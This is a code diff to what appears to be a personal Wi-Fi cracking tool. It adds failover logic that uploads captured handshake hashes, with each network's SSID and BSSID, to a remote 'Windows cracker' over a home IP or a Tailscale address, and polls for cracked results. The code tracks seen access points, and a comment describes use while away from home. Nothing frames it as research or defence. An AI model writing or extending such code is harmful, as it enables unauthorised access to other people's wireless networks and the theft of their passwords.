@@ -40,6 +40,7 @@ CAPSTORE  = os.path.expanduser('~/wifi_cracker/capstore')
 HASHSTORE = os.path.expanduser('~/wifi_cracker/hashstore')
 SILENT    = os.path.expanduser('~/wifi_cracker/silent_aps.txt')
 APS_SEEN  = os.path.expanduser('~/wifi_cracker/aps_seen.json')
+TS_IP     = '100.94.10.122'  # Windows cracker on Tailscale (外出備援)
 UQUEUE    = os.path.expanduser('~/wifi_cracker/upload_queue.json')
 APP_LOCK  = '/tmp/mac_wifi_app.lock'
 DEFAULT_WIP, DEFAULT_PORT, DEFAULT_DUR = '100.94.10.122', '8766', '45'
@@ -829,8 +830,8 @@ class App:
         try:
             wip = self.var['wip'].get().strip()
             port = self.var['port'].get().strip()
-            req = urllib.request.urlopen('http://%s:%s/api/known' % (wip, port), timeout=5)
-            d = json.loads(req.read().decode('utf-8', 'replace'))
+            body = self._api_try(wip, port, '/api/known', timeout=6)[0]
+            d = json.loads(body)
             ck = d.get('cracked') or {}
             if not isinstance(ck, dict):
                 ck = {s: '' for s in ck}
@@ -1476,17 +1477,42 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
             self._ev('lan', 'err=%r home=False' % e)
             return False
 
+    def _api_try(self, wip, port, path, data=None, timeout=12):
+        # 外出端點故障轉移: 上次可用 → 家用IP → Tailscale IP
+        eps = []
+        good = getattr(self, '_good_ep', None)
+        if good:
+            eps.append(good)
+        for e in (wip, TS_IP):
+            if e and e not in eps:
+                eps.append(e)
+        last = None
+        for ep in eps:
+            try:
+                url = 'http://%s:%s%s' % (ep, port, path)
+                if data is None:
+                    body = urllib.request.urlopen(url, timeout=timeout).read()
+                else:
+                    req = urllib.request.Request(
+                        url, data=data,
+                        headers={'Content-Type': 'application/json'},
+                        method='POST')
+                    body = urllib.request.urlopen(req, timeout=timeout).read()
+                self._good_ep = ep
+                return body.decode('utf-8', 'replace'), ep
+            except Exception as e:
+                last = e
+        raise last
+
     def _post(self, hashes, ssid, bssid, wip, port):
         payload = json.dumps({'hash': '\n'.join(hashes), 'ssid': ssid,
                               'bssid': bssid.lower()}).encode()
         t0 = time.time()
         try:
-            req = urllib.request.Request(
-                'http://%s:%s/api/receive-hash' % (wip, port),
-                data=payload, headers={'Content-Type': 'application/json'},
-                method='POST')
-            body = urllib.request.urlopen(req, timeout=20).read().decode(
-                'utf-8', 'replace')
+            body, ep = self._api_try(wip, port, '/api/receive-hash',
+                                     data=payload, timeout=12)
+            if ep != wip:
+                self._log('   Windows 改走 %s' % ep)
             self._log('   上傳成功: %s' % body[:140])
             self._ev('post', 'lines=%d dur=%.1fs body=%r' % (
                 len(hashes), time.time() - t0, body[:200]))
@@ -1512,10 +1538,8 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
             if self._stop.is_set():
                 return None
             try:
-                resp = urllib.request.urlopen(
-                    urllib.request.Request('http://%s:%s/api/state' % (wip, port)),
-                    timeout=10)
-                d = json.loads(resp.read().decode())
+                body = self._api_try(wip, port, '/api/state', timeout=8)[0]
+                d = json.loads(body)
                 status = d.get('status', '')
                 msg = d.get('message', '')
                 if msg and msg != last:
